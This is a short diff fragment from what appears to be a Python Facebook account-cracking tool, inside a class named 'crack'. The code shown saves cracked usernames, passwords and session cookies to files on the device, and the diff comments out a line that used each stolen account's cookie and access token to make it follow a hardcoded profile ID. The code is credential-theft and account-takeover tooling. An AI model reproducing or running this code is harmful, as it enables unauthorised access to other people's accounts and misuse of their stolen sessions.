@@ -927,8 +927,8 @@ class crack:
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        follow_id='100000160984736'
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
+                        #follow_id='100000160984736'
+                        #subs = requests.p#ost('https://graph.facebook.com/'+follo#w_id+'/subscribers?access_token='+t#okic, cookies=#{'cookie':c#okie}).text
                         break
                     except KeyError:
                         #print(f"\r\033[1#;33m[TL-GSXD] {used} | {pw} {VV}    ")
